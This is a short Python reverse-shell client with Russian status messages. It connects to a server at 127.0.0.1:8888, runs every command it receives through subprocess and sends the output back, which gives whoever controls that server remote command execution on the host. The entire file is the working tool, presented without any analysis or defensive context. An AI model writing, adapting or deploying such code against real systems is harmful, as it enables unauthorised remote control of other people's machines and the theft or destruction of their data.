import socket
import subprocess
from pystyle import Colors
import os


Success = Colors.green + "[+]" + Colors.reset
Error = Colors.red + "[-]" + Colors.reset


def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 8888))

        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Success} Подключение к серверу произошло успешно!")

        while True:
            command = s.recv(4096).decode()
            if command.lower() == 'exit':
                print(f"\n{Error} Соединение разорвано!")
                break
            output = subprocess.getoutput(command)
            s.send(output.encode())

        s.close()
    except Exception as e:
        print(f"{Error} Произошла ошибка при подключении: {e}")


def main():
    reverse_shell()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Colors.green + "\nДо свидания!" + Colors.reset)